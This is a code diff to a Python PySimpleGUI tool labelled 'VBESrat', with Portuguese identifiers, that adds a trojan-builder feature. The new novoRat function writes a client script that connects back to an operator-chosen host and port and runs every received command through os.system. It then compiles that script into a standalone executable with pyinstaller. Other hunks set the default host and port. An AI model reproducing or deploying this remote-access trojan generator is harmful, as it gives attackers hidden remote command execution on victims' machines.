@@ -1,9 +1,10 @@
 
+from pathlib import Path
 from PySimpleGUI import PySimpleGUI as sg
 import os
 import socket
 
-
+ipPadrao = socket.gethostbyname(socket.gethostname())
 portaPadrao = 8081
 madeBy = 'VBESrat'
 version = '1.0'
@@ -17,7 +18,7 @@ sg.theme_button_color(('white', '#9700FF'))
 def init():
     layout = [
         [sg.Text('Host')],
-        [sg.Input(socket.gethostbyname(socket.gethostname()), key='host')],
+        [sg.Input(ipPadrao, key='host')],
         [sg.Text('Porta')],
         [sg.Input(portaPadrao, key='porta')],
         [sg.Button('Conectar', key='btnConn', size=(40,1), pad=(6,15))]
@@ -100,7 +101,7 @@ def rat(client, client_addr,janela):
         [sg.Text('Criar RAT')],
         [sg.Text('')],
         [sg.Text('Host', size=(18,1)), sg.Text('Porta', size=(17,1))],
-        [sg.Input(key='inpRatHost', size=(20,2)), sg.Input(key='inpRatPorta', size=(20,2))],        
+        [sg.Input(ipPadrao, key='inpRatHost', size=(20,2)), sg.Input(portaPadrao, key='inpRatPorta', size=(20,2))],        
         [sg.Text('Nome')],
         [sg.Input(key='inpRatNome', size=(42,2))],
         [sg.Text('')],
@@ -119,13 +120,17 @@ def rat(client, client_addr,janela):
             host = val['inpRatHost']
             porta = val['inpRatPorta']
             nome = val['inpRatNome']
+            janelaRat.close()
             novoRat(host, porta, nome)
             
 
 def novoRat(host, porta, nome):
-    config = list()
-    config = [host, porta, nome]
-    return config
+    with open('build/rat/'+nome + '.py', "w") as arquivo:
+        arquivo.write('import socket\nimport subprocess\nimport os\nHOST=socket.gethostbyname("'+ host +'")\nPORT='+ porta +'\nclient = socket.socket()\nclient.connect((HOST, PORT))\nwhile True:\n    command = client.recv(1024)\n    command = command.decode()\n    os.system(command)')
+        
+        conv = os.system("pyinstaller --onefile build/rat/"+ nome +".py")
+
+        sg.popup("Criado em: dist/"+ nome +"")
 
 
 def cmd(client, client_addr, janela):
